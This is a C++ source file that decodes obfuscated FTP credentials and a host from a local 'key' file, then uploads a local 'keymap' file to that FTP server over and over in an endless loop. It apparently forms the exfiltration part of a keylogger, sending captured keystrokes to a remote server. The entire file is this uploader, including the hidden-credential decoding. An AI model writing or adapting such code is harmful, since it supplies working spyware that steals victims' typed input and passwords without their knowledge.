#include <stdio.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fstream>
#include <iostream>

#define LOCAL_FILE      "keymap"
#define COUNTER_FILE    "counter"

using namespace std;

string host;

static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *stream)
{
  curl_off_t nread;
  size_t retcode = fread(ptr, size, nmemb,(FILE*) stream);
  nread = (curl_off_t)retcode;
  return retcode;
}

int counter(){
	char count[4];
	ifstream input(COUNTER_FILE,ios::binary);
	if(input.is_open())
	{
	input>>count;
	input.close();
	return atoi(count);
	}else return 0;
}

void identifyHost()
{
	ifstream infile("key" ,ios_base::in);
	infile>>host;infile>>host;
	infile.close();
}

int main(){
	
	//variables
	CURL *curl;
	CURLcode res;
	FILE *hd_src;
	struct stat file_info;
	curl_off_t fsize;
	int r;
	string remote_url;
	char temp[6] = {0};
	string key;
	string userpass;
	ofstream outfile;
	ifstream infile;
	identifyHost();
	itoa(counter(),temp,10);
	remote_url = "ftp://" + host + "/id" + temp + ".txt";
	memset(temp,0,6);
	
	//decoding key
	infile.open("key" ,ios_base::in);
	if(!infile.is_open())                    //is open
	{
		cout<<"Error: can not find the key"<<endl;
		Sleep(1000);
		exit(1);
	}
	infile>>key;
	infile.close();
	for(int i = 0;i <= 2;i++)
	{
		temp[2-i] = key[key.size()-1];
		key.pop_back();
	}
	r = atoi(temp);
	for(int i = 0;i <= key.size() - 6;i +=6)
	{
		for(int u = 0;u < 6;u++)
			temp[u] = key[u + i];
			userpass.push_back((char)(atoi(temp)/r));
	}
	//creating "keymap"
	outfile.open(LOCAL_FILE, ios_base::out | ios_base::app);
	outfile.close();
	
	//loop
    while(true)
	{
    struct curl_slist *headerlist=NULL;
	infile.open(LOCAL_FILE, ios_base::in);
    outfile.open(LOCAL_FILE "Up", ios_base::out);
	infile.read(temp, sizeof(char));
	while (!infile.eof())
	{
		outfile.write(temp, sizeof(char));
		infile.read(temp, sizeof(char));
	}
	infile.close();
	outfile.close();
  
	if(stat(LOCAL_FILE, &file_info))
		return 1;
    fsize = (curl_off_t)file_info.st_size;
    hd_src = fopen(LOCAL_FILE, "rb");
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
	if(curl)
	{
	  
		//Options
		curl_easy_setopt( curl, CURLOPT_USERPWD,userpass.c_str());
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_URL, remote_url.c_str());
		curl_easy_setopt(curl, CURLOPT_POSTQUOTE, headerlist);
		curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);
		curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,(curl_off_t)fsize);

		res = curl_easy_perform(curl);
		if(res != CURLE_OK)
		{
			curl_easy_strerror(res);
			Sleep(1000);
		}

		curl_easy_cleanup(curl);
	}

	fclose(hd_src);
	}//end while
	curl_global_cleanup();
	return 0;
}
